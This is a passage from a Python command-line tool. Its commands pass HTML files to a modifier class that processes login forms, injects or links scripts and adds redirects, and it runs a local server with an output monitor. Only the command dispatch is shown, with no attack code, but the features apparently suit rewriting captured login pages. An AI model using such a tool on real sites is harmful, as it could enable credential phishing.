                        # Prompt for selection
                        selections = modifier.prompt_for_selection()
                        if selections is not None:
                            modifier.modify_files(selections)
            elif command.startswith("login "):
                # Extract the file patterns from the command
                file_patterns = command[6:].strip().split()
                if not file_patterns:
                    print(f"{Fore.RED}Error: No file patterns provided.")
                    print(f"{Fore.YELLOW}Usage: login <file_pattern> [<file_pattern> ...]")
                else:
                    # Create an instance of the HtmlModifier class and process the login forms
                    modifier = HtmlModifier()
                    modifier.process_login_forms(file_patterns)
            elif command.startswith("master "):
                # Extract the file patterns from the command
                file_patterns = command[7:].strip().split()
                if not file_patterns:
                    print(f"{Fore.RED}Error: No file patterns provided.")
                    print(f"{Fore.YELLOW}Usage: master <file_pattern> [<file_pattern> ...]")
                else:
                    # Create an instance of the HtmlModifier class and process with all optimizations
                    modifier = HtmlModifier()
                    modifier.process_master_command(file_patterns)
            elif command == "syntax" or command.startswith("syntax "):
                parts = command.split(maxsplit=1)
                if len(parts) > 1:
                    show_syntax(parts[1])
                else:
                    show_syntax()
            elif command.startswith("template "):
                html_paths_concat = command[len("template "):].strip()
                if not html_paths_concat:
                    print(f"{Fore.RED}Error: No HTML file path provided.")
                    print(f"{Fore.YELLOW}Usage: template <html_path(s)>")
                else:
                    try:
                        # Process templates with normal output
                        processed_files = embed_resources_and_update_images(html_paths_concat, silent=False)
                        if processed_files:
                            print(f"{Fore.GREEN}✓ Successfully processed {len(processed_files)} template(s)")
                    except Exception as e:
                        print(f"{Fore.RED}Error processing template: {e}")
            elif command == "exit":
                print(f"{Fore.RED}Exiting...")
                shutdown_server(silent=True)
                sys.exit(0)
            else:
                print(f"{Fore.RED}✗ Unknown command. Type 'help' for available commands.")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}Exiting...")
            shutdown_server(silent=True)
            sys.exit(0)

# Main function
def main():
    # Register the server shutdown function to run on exit with silent mode
    atexit.register(lambda: shutdown_server(silent=True))
    
    # Start monitoring eden outputs
    start_eden_output_monitor()
    
    try:
        setup_server()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}Exiting...")
        stop_eden_output_monitor()  # Stop monitoring thread
        shutdown_server(silent=True)
        sys.exit(0)

if __name__ == "__main__":
    # Check if any command line arguments were provided
    if len(sys.argv) > 1:
        # Process command line arguments
        command = sys.argv[1].lower()
        
        if command == "server":
            main()
        elif command == "help":
            show_help()
        elif command.startswith("output") and len(sys.argv) > 2:
            set_output_dir(sys.argv[2])
        elif command.startswith("loaddir") and len(sys.argv) > 2:
            set_download_dir(sys.argv[2])
        elif command.startswith("link") and len(sys.argv) > 2:
            link_script_to_html(sys.argv[2])
        elif command.startswith("redirect") and len(sys.argv) > 2:
            modifier = HtmlModifier()
            if modifier.process_files(sys.argv[2:]):
                selections = modifier.prompt_for_selection()
                if selections is not None:
                    modifier.modify_files(selections)
        else:
            print(f"Unknown command: {command}")
            show_help()
    else:
        # No arguments provided, run the main server function by default
        main()
